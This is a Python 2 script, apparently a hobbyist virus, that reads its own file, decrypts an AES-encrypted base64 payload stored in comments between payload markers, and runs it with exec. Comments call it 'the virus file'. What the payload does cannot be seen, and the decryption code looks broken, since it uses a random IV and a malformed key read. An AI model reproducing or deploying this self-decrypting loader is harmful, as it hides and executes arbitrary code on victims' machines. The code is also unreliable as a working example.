print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
print "bohohoo"

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)
   
   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload